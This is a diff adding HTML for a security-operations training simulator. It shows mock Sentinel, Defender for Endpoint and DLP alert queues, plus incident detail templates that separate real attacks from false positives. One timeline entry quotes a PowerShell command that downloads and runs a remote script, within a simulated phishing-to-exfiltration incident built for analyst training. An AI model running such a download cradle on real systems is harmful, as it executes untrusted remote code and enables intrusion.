+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-med)"></span>Medium</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-low)"></span>Low</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-info)"></span>Info</button>
+        </div>
+        <div class="filter-sep"></div>
+        <span class="filter-label">Status:</span>
+        <select class="filter-select"><option>All statuses</option><option>New</option><option>Active</option><option>Closed</option></select>
+        <div class="filter-sep"></div>
+        <span class="filter-label">Time:</span>
+        <select class="filter-select"><option>Last 24 hours</option><option>Last 7 days</option><option>Last 30 days</option><option>Custom range</option></select>
+      </div>
+    </div>
+    <div class="content-body">
+      <div class="card">
+        <div class="card-header">
+          <span>All Incidents (11)</span>
+          <span class="refresh-time">Last refreshed: 04 Mar 2026 10:32 UTC</span>
+        </div>
+        <table>
+          <thead>
+            <tr>
+              <th>Severity <span class="sort-icon">&#9660;</span></th>
+              <th>ID</th>
+              <th>Title</th>
+              <th>Status</th>
+              <th>Alerts</th>
+              <th>Entities</th>
+              <th>Last Activity <span class="sort-icon">&#9660;</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0847')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td class="mono">INC-0847</td>
+              <td>Multi-stage attack: Credential access &amp; data exfiltration</td>
+              <td><span class="status status-active">New</span></td>
+              <td>4</td>
+              <td>3</td>
+              <td class="mono">04 Mar 09:31</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0843')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">INC-0843</td>
+              <td>Impossible travel activity &mdash; Sarah Chen</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 08:15</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0845')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">INC-0845</td>
+              <td>Brute-force attempt against Exchange Online</td>
+              <td><span class="status status-active">Active</span></td>
+              <td>1</td><td>2</td>
+              <td class="mono">04 Mar 07:44</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0846')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td class="mono">INC-0846</td>
+              <td>Suspicious PowerShell execution &mdash; WS-IT-0PC09</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 09:05</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0844')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td class="mono">INC-0844</td>
+              <td>Unusual resource access &mdash; new-hire onboarding activity</td>
+              <td><span class="status status-closed">Closed</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">03 Mar 16:20</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0848')">
+              <td><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></td>
+              <td class="mono">INC-0848</td>
+              <td>Malware detected (EICAR test) &mdash; WS-SEC-0201</td>
+              <td><span class="status status-resolved">Resolved</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 07:10</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0849')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td class="mono">INC-0849</td>
+              <td>Possible token replay &mdash; session used from new IP</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 09:48</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0850')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">INC-0850</td>
+              <td>Suspicious inbox rule creation &mdash; auto-forward to external</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 08:55</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0851')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">INC-0851</td>
+              <td>Mass file deletion in SharePoint &mdash; Project Omega site</td>
+              <td><span class="status status-active">Active</span></td>
+              <td>1</td><td>2</td>
+              <td class="mono">04 Mar 07:30</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0852')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td class="mono">INC-0852</td>
+              <td>Sign-in from unmanaged device &mdash; tom.nguyen</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 10:02</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('sentinel-inc-0853')">
+              <td><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></td>
+              <td class="mono">INC-0853</td>
+              <td>MFA registration from unusual location &mdash; priya.sharma</td>
+              <td><span class="status status-new">New</span></td>
+              <td>1</td><td>1</td>
+              <td class="mono">04 Mar 06:45</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ╔═══════════════════════════════════════════════════════╗
+     ║  DEFENDER FOR ENDPOINT (EDR)                         ║
+     ╚═══════════════════════════════════════════════════════╝ -->
+<div id="dfe" class="main hidden">
+  <div class="sidebar">
+    <div class="nav-scroll">
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">General <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#128200; Dashboard</div>
+        <div class="nav-item active">&#128680; Alerts queue <span class="nav-badge">8</span></div>
+        <div class="nav-item">&#128187; Device inventory</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Endpoints <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#128270; Advanced hunting</div>
+        <div class="nav-item">&#128736; Vulnerability mgmt</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Configuration <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#9881; Settings</div>
+        <div class="nav-item">&#128268; APIs</div>
+      </div>
+    </div>
+    <div class="sidebar-footer">
+      <button class="sf-btn">&#128218; Docs</button>
+      <button class="sf-btn">&#128172; Feedback</button>
+    </div>
+  </div>
+  <div class="content">
+    <div class="content-header">
+      <div class="breadcrumb">SOCSimulator <span>&#8250;</span> Defender for Endpoint <span>&#8250;</span> <strong>Alerts</strong></div>
+      <div class="page-header">
+        <div>
+          <div class="page-title">Alerts Queue</div>
+          <div class="subtitle">Endpoint alerts &mdash; filtered by last 24h</div>
+        </div>
+        <div class="page-actions">
+          <button class="btn btn-ghost">&#8635; Refresh</button>
+          <button class="btn btn-ghost">&#128229; Export</button>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-card"><div class="label">High</div><div class="stat-row"><span class="value high">3</span><span class="trend up">&#9650; +3</span></div></div>
+        <div class="stat-card"><div class="label">Medium</div><div class="stat-row"><span class="value med">3</span><span class="trend up">&#9650; +1</span></div></div>
+        <div class="stat-card"><div class="label">Low</div><div class="stat-row"><span class="value low">2</span><span class="trend down">&#9660; -1</span></div></div>
+      </div>
+      <div class="filter-bar">
+        <span class="filter-label">Severity:</span>
+        <div class="filter-group">
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-high)"></span>High</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-med)"></span>Medium</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-low)"></span>Low</button>
+        </div>
+        <div class="filter-sep"></div>
+        <span class="filter-label">Category:</span>
+        <select class="filter-select"><option>All categories</option><option>Execution</option><option>Exfiltration</option><option>Credential Access</option><option>Persistence</option><option>Defense Evasion</option><option>Malware</option></select>
+      </div>
+    </div>
+    <div class="content-body">
+      <div class="card">
+        <div class="card-header"><span>Alerts (8)</span></div>
+        <table>
+          <thead>
+            <tr><th>Severity <span class="sort-icon">&#9660;</span></th><th>Alert</th><th>Device</th><th>Status</th><th>Category</th><th>Time <span class="sort-icon">&#9660;</span></th></tr>
+          </thead>
+          <tbody>
+            <tr class="clickable" onclick="openDetail('dfe-alert-ps')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td>Suspicious PowerShell download &amp; encoded execution</td>
+              <td class="mono">WS-PC-0142</td>
+              <td><span class="status status-active">New</span></td>
+              <td>Execution</td>
+              <td class="mono">09:12</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-usb')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td>Sensitive file copy to removable media</td>
+              <td class="mono">WS-PC-0142</td>
+              <td><span class="status status-active">New</span></td>
+              <td>Exfiltration</td>
+              <td class="mono">09:18</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-fp1')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td>Potentially unwanted application detected</td>
+              <td class="mono">WS-MKT-0087</td>
+              <td><span class="status status-new">New</span></td>
+              <td>Malware</td>
+              <td class="mono">08:33</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-fp2')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td>PowerShell script with uncommon execution policy</td>
+              <td class="mono">WS-IT-0PC09</td>
+              <td><span class="status status-closed">Resolved</span></td>
+              <td>Execution</td>
+              <td class="mono">09:05</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-cred')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td>LSASS memory access detected</td>
+              <td class="mono">WS-IT-0PC03</td>
+              <td><span class="status status-new">New</span></td>
+              <td>Credential Access</td>
+              <td class="mono">10:15</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-svc')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td>Suspicious service installation via sc.exe</td>
+              <td class="mono">SVR-APP-0012</td>
+              <td><span class="status status-new">New</span></td>
+              <td>Persistence</td>
+              <td class="mono">07:22</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-net')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td>Outbound connection to uncommon geolocation</td>
+              <td class="mono">WS-FIN-0034</td>
+              <td><span class="status status-new">New</span></td>
+              <td>Command &amp; Control</td>
+              <td class="mono">08:48</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dfe-alert-tor')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td>Tor browser process detected</td>
+              <td class="mono">WS-RND-0091</td>
+              <td><span class="status status-active">Active</span></td>
+              <td>Defense Evasion</td>
+              <td class="mono">09:55</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ╔═══════════════════════════════════════════════════════╗
+     ║  PURVIEW DLP                                         ║
+     ╚═══════════════════════════════════════════════════════╝ -->
+<div id="dlp" class="main hidden">
+  <div class="sidebar">
+    <div class="nav-scroll">
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Data Loss Prevention <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item active">&#128680; Alerts <span class="nav-badge">9</span></div>
+        <div class="nav-item">&#128200; Activity explorer</div>
+        <div class="nav-item">&#128196; Policies</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Classification <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#127991; Sensitive info types</div>
+        <div class="nav-item">&#128278; Sensitivity labels</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Configuration <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#9881; Settings</div>
+      </div>
+    </div>
+    <div class="sidebar-footer">
+      <button class="sf-btn">&#128218; Docs</button>
+      <button class="sf-btn">&#128172; Feedback</button>
+    </div>
+  </div>
+  <div class="content">
+    <div class="content-header">
+      <div class="breadcrumb">SOCSimulator <span>&#8250;</span> Purview DLP <span>&#8250;</span> <strong>Alerts</strong></div>
+      <div class="page-header">
+        <div>
+          <div class="page-title">DLP Alerts</div>
+          <div class="subtitle">Purview &mdash; Data Loss Prevention policy matches</div>
+        </div>
+        <div class="page-actions">
+          <button class="btn btn-ghost">&#8635; Refresh</button>
+          <button class="btn btn-ghost">&#128229; Export</button>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-card"><div class="label">High</div><div class="stat-row"><span class="value high">3</span><span class="trend up">&#9650; +3</span></div></div>
+        <div class="stat-card"><div class="label">Medium</div><div class="stat-row"><span class="value med">2</span><span class="trend up">&#9650; +1</span></div></div>
+        <div class="stat-card"><div class="label">Low</div><div class="stat-row"><span class="value low">2</span><span class="trend flat">&mdash; 0</span></div></div>
+        <div class="stat-card"><div class="label">Informational</div><div class="stat-row"><span class="value info">2</span><span class="trend flat">&mdash; 0</span></div></div>
+      </div>
+      <div class="filter-bar">
+        <span class="filter-label">Severity:</span>
+        <div class="filter-group">
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-high)"></span>High</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-med)"></span>Medium</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-low)"></span>Low</button>
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-info)"></span>Info</button>
+        </div>
+        <div class="filter-sep"></div>
+        <span class="filter-label">Policy:</span>
+        <select class="filter-select"><option>All policies</option><option>Financial Data Protection</option><option>PII Protection</option><option>Removable Media</option></select>
+      </div>
+    </div>
+    <div class="content-body">
+      <div class="card">
+        <div class="card-header"><span>Policy Matches (9)</span></div>
+        <table>
+          <thead>
+            <tr><th>Severity <span class="sort-icon">&#9660;</span></th><th>ID</th><th>Policy</th><th>User</th><th>Activity</th><th>Status</th><th>Time <span class="sort-icon">&#9660;</span></th></tr>
+          </thead>
+          <tbody>
+            <tr class="clickable" onclick="openDetail('dlp-9924')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td class="mono">DLP-9924</td>
+              <td>Financial data sent to external recipient</td>
+              <td>john.martinez</td>
+              <td>Email - External</td>
+              <td><span class="status status-active">New</span></td>
+              <td class="mono">09:23</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-9925')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td class="mono">DLP-9925</td>
+              <td>Confidential files copied to removable storage</td>
+              <td>john.martinez</td>
+              <td>File Copy - USB</td>
+              <td><span class="status status-active">New</span></td>
+              <td class="mono">09:18</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-fp1')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">DLP-9921</td>
+              <td>SSN pattern in outbound email</td>
+              <td>laura.gomez</td>
+              <td>Email - External</td>
+              <td><span class="status status-closed">Closed - FP</span></td>
+              <td class="mono">08:50</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-fp2')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td class="mono">DLP-9922</td>
+              <td>Confidential label in Teams message</td>
+              <td>kevin.wu</td>
+              <td>Teams Chat</td>
+              <td><span class="status status-new">New</span></td>
+              <td class="mono">09:40</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-fp3')">
+              <td><span class="sev sev-info"><span class="sev-dot"></span>Info</span></td>
+              <td class="mono">DLP-9923</td>
+              <td>Credit card pattern in SharePoint upload</td>
+              <td>anna.patel</td>
+              <td>SharePoint Upload</td>
+              <td><span class="status status-resolved">Resolved</span></td>
+              <td class="mono">08:20</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-9926')">
+              <td><span class="sev sev-high"><span class="sev-dot"></span>High</span></td>
+              <td class="mono">DLP-9926</td>
+              <td>Bulk download of classified documents from SharePoint</td>
+              <td>marcus.johnson</td>
+              <td>SharePoint Download</td>
+              <td><span class="status status-active">Active</span></td>
+              <td class="mono">07:55</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-9927')">
+              <td><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></td>
+              <td class="mono">DLP-9927</td>
+              <td>Sensitive file synced to personal OneDrive</td>
+              <td>diana.reyes</td>
+              <td>Cloud Sync</td>
+              <td><span class="status status-new">New</span></td>
+              <td class="mono">09:38</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-9928')">
+              <td><span class="sev sev-low"><span class="sev-dot"></span>Low</span></td>
+              <td class="mono">DLP-9928</td>
+              <td>External sharing link created for internal document</td>
+              <td>james.oconnor</td>
+              <td>SharePoint Sharing</td>
+              <td><span class="status status-new">New</span></td>
+              <td class="mono">10:05</td>
+            </tr>
+            <tr class="clickable" onclick="openDetail('dlp-9929')">
+              <td><span class="sev sev-info"><span class="sev-dot"></span>Info</span></td>
+              <td class="mono">DLP-9929</td>
+              <td>Labeled document printed on unmanaged printer</td>
+              <td>nina.kowalski</td>
+              <td>Print</td>
+              <td><span class="status status-new">New</span></td>
+              <td class="mono">08:10</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ STATUS BAR ═══ -->
+<div class="statusbar">
+  <span class="sb-item"><span class="sb-dot"></span> Connected</span>
+  <span class="sb-sep"></span>
+  <span class="sb-item">Workspace: contoso-soc-prod</span>
+  <span class="sb-sep"></span>
+  <span class="sb-item">Region: East US</span>
+  <span class="sb-right">
+    <span class="sb-item">Data ingestion: 2.4 GB/day</span>
+    <span class="sb-sep"></span>
+    <span class="sb-item" id="sb-time">Last sync: --:--:-- UTC</span>
+  </span>
+</div>
+
+</div><!-- /app-shell -->
+
+<!-- ═══ DETAIL PANEL ═══ -->
+<div id="detail-overlay" class="detail-overlay" onclick="closeDetail(event)">
+<div class="detail-panel" onclick="event.stopPropagation()">
+  <div class="detail-top" id="detail-top"></div>
+  <div class="detail-body" id="detail-content"></div>
+</div>
+</div>
+
+<!-- ═══ TOAST ═══ -->
+<div class="toast" id="toast">
+  <span class="toast-icon">&#128680;</span>
+  <div class="toast-content">
+    <div class="toast-title">New High-Severity Alerts</div>
+    <div class="toast-msg">Multiple high-severity incidents require triage. Check Sentinel, DfE, and DLP queues.</div>
+  </div>
+  <button class="toast-close" onclick="dismissToast()">&times;</button>
+</div>
+
+<!-- ════════════════════════════════════════════════════════
+     DETAIL TEMPLATES
+     ════════════════════════════════════════════════════════ -->
+<div class="hidden">
+
+<!-- === SENTINEL INC-0847 (REAL) === -->
+<div id="tpl-sentinel-inc-0847" data-title="INC-0847: Multi-stage attack &mdash; Credential access &amp; data exfiltration" data-sub="Created 04 Mar 2026 09:12 UTC &bull; Last updated 09:35 UTC &bull; Assigned to: Unassigned" data-sev="high">
+  <div class="banner banner-warn">
+    <span class="banner-icon">&#9888;</span>
+    <div>This incident contains <strong>4 correlated alerts</strong> involving the same user and device. Multiple MITRE ATT&amp;CK tactics detected: Initial Access, Execution, Collection, Exfiltration.</div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Incident Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Status</span><span class="val"><span class="status status-active">New</span></span>
+      <span class="lbl">Classification</span><span class="val">Not yet classified</span>
+      <span class="lbl">MITRE Tactics</span><span class="val"><span class="tag">Initial Access</span> <span class="tag">Execution</span> <span class="tag">Collection</span> <span class="tag">Exfiltration</span></span>
+      <span class="lbl">Owner</span><span class="val">Unassigned</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Entities</div>
+    <div>
+      <span class="entity"><span class="entity-icon">&#128100;</span> john.martinez@contoso.com</span>
+      <span class="entity"><span class="entity-icon">&#128187;</span> WS-PC-0142</span>
+      <span class="entity"><span class="entity-icon">&#127760;</span> 185.220.101.34 (Tor exit node)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Timeline</div>
+    <div class="timeline">
+      <div class="timeline-item ti-med">
+        <div class="timeline-time">04 Mar 2026 &mdash; 08:47:22 UTC</div>
+        <div class="timeline-title">Suspicious sign-in from anomalous IP</div>
+        <div class="timeline-desc">Sign-in to john.martinez@contoso.com from IP <strong>185.220.101.34</strong> (Tor exit node, geolocation: Bucharest, Romania). User's normal locations: Dallas, TX. Risk level: High. MFA was not triggered (session token reused from phished session).</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">04 Mar 2026 &mdash; 09:12:05 UTC</div>
+        <div class="timeline-title">Suspicious PowerShell download &amp; encoded command execution</div>
+        <div class="timeline-desc">On device <strong>WS-PC-0142</strong>, process <code>powershell.exe</code> launched with encoded command that decoded to:<br><code class="mono" style="color:#d13438">IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/xK9mZv3T')</code><br>The downloaded script performed file enumeration on network shares (\\FILESRV01\Finance\).</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">04 Mar 2026 &mdash; 09:18:41 UTC</div>
+        <div class="timeline-title">Sensitive files copied to USB removable media</div>
+        <div class="timeline-desc">Files written to <strong>E:\exfil\</strong> on Kingston DataTraveler (USB SN: 0019E3...B42F):<br><code class="mono">Q4_Financial_Results_2025.xlsx</code> (2.4 MB, labeled Confidential)<br><code class="mono">Employee_Compensation_2026.csv</code> (890 KB, contains PII)<br><code class="mono">M&A_Pipeline_Draft.pptx</code> (5.1 MB, labeled Highly Confidential)</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">04 Mar 2026 &mdash; 09:23:18 UTC</div>
+        <div class="timeline-title">Data exfiltration via outbound email</div>
+        <div class="timeline-desc">Email sent from john.martinez@contoso.com to <strong>j.martinezprivate.2024@gmail.com</strong> with subject &quot;Backup docs&quot;.<br>Attachments: <code class="mono">Q4_Financial_Results_2025.xlsx</code>, <code class="mono">Employee_Compensation_2026.csv</code>.<br>DLP policy &quot;Financial Data Protection&quot; triggered. Email was <strong>delivered</strong> (policy action: audit only).</div>
+      </div>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation Notes</div>
+    <div class="evidence-block">
+      <div class="ev-title">Key Question: Was john.martinez compromised, or is this an insider threat?</div>
+      <div class="ev-detail">The Tor exit node sign-in + reused session token strongly suggests credential phishing followed by session hijacking. Cross-reference: check if john.martinez reported any phishing emails. Review Defender for Endpoint process tree for WS-PC-0142. Review DLP alerts for full exfiltration scope.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0843 (FP) === -->
+<div id="tpl-sentinel-inc-0843" data-title="INC-0843: Impossible travel activity &mdash; Sarah Chen" data-sub="Created 04 Mar 2026 08:15 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">User</span><span class="val">sarah.chen@contoso.com</span>
+      <span class="lbl">Description</span><span class="val">Sign-in from Seattle, WA at 07:45 and from London, UK at 08:12. Flagged as impossible travel (27 min, 7,700 km).</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">Likely False Positive</div>
+      <div class="ev-detail">Sarah Chen (IT Admin) is on a business trip to London. The Seattle sign-in was via corporate VPN (always-on). Travel was pre-approved in ServiceNow (REQ-2026-4412). London IP matches Contoso's London office range (203.0.113.0/24). No suspicious activity following sign-in.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0845 (FP) === -->
+<div id="tpl-sentinel-inc-0845" data-title="INC-0845: Brute-force attempt against Exchange Online" data-sub="Created 04 Mar 2026 07:44 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">Source IPs</span><span class="val mono">45.33.32.156, 91.108.56.0 (known botnets)</span>
+      <span class="lbl">Targets</span><span class="val">admin@contoso.com, ceo@contoso.com</span>
+      <span class="lbl">Attempts</span><span class="val">347 failed attempts over 2 hours</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Password spray / bot activity</div>
+      <div class="ev-detail">All 347 attempts failed. Targeted generic addresses (admin@, ceo@). Source IPs are known botnet infrastructure. Smart lockout engaged after 10 attempts per account. No successful auth. MFA is enforced on all targeted accounts. This is internet noise &mdash; standard password spray activity.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0846 (FP) === -->
+<div id="tpl-sentinel-inc-0846" data-title="INC-0846: Suspicious PowerShell execution &mdash; WS-IT-0PC09" data-sub="Created 04 Mar 2026 09:05 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">Device</span><span class="val mono">WS-IT-0PC09</span>
+      <span class="lbl">User</span><span class="val">mike.ross@contoso.com (IT Operations)</span>
+      <span class="lbl">Command</span><span class="val mono">Set-ExecutionPolicy Bypass -Scope Process; .\Deploy-Updates.ps1</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Authorized IT maintenance</div>
+      <div class="ev-detail">mike.ross is a member of the IT-Admins group. Deploy-Updates.ps1 is a signed, known script in the IT automation repo (SHA256 matches approved version). Execution happened during scheduled maintenance window (Tue 09:00-11:00). Change ticket: CHG-2026-0891.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0844 (FP) === -->
+<div id="tpl-sentinel-inc-0844" data-title="INC-0844: Unusual resource access &mdash; new-hire onboarding" data-sub="Created 03 Mar 2026 16:20 UTC &bull; Status: Closed" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">User</span><span class="val">emily.nakamura@contoso.com (new hire, started 03 Mar)</span>
+      <span class="lbl">Activity</span><span class="val">Accessed 14 SharePoint sites and 38 files in first 2 hours. Triggered volumetric anomaly.</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Normal onboarding behavior</div>
+      <div class="ev-detail">emily.nakamura started on 03 Mar (confirmed in HR system). All accessed sites are part of her team's standard onboarding checklist. No downloads of sensitive/labeled content. Access pattern matches other new hires. Closed by SOC analyst T. Williams.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0848 (FP) === -->
+<div id="tpl-sentinel-inc-0848" data-title="INC-0848: Malware detected (EICAR test file) &mdash; WS-SEC-0201" data-sub="Created 04 Mar 2026 07:10 UTC &bull; Status: Resolved" data-sev="info">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></span>
+      <span class="lbl">Device</span><span class="val mono">WS-SEC-0201</span>
+      <span class="lbl">User</span><span class="val">david.park@contoso.com (Security Engineer)</span>
+      <span class="lbl">File</span><span class="val mono">C:\Test\eicar_test.txt</span>
+      <span class="lbl">Detection</span><span class="val">EICAR-Test-File (not a real threat)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Planned AV validation</div>
+      <div class="ev-detail">EICAR test file is an industry-standard antivirus test string. david.park (SecOps) was running quarterly AV validation per procedure SEC-PROC-014. File was quarantined automatically. Test documented in Confluence: "Q1 2026 AV Validation Results".</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DfE PowerShell (REAL) === -->
+<div id="tpl-dfe-alert-ps" data-title="Alert: Suspicious PowerShell download &amp; encoded execution" data-sub="Device: WS-PC-0142 &bull; User: john.martinez &bull; 04 Mar 2026 09:12 UTC" data-sev="high">
+  <div class="banner banner-warn">
+    <span class="banner-icon">&#9888;</span>
+    <div>This device has <strong>2 active high-severity alerts</strong>. Correlated with Sentinel INC-0847 and DLP alerts DLP-9924, DLP-9925.</div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Execution</span> <span class="tag">Defense Evasion</span></span>
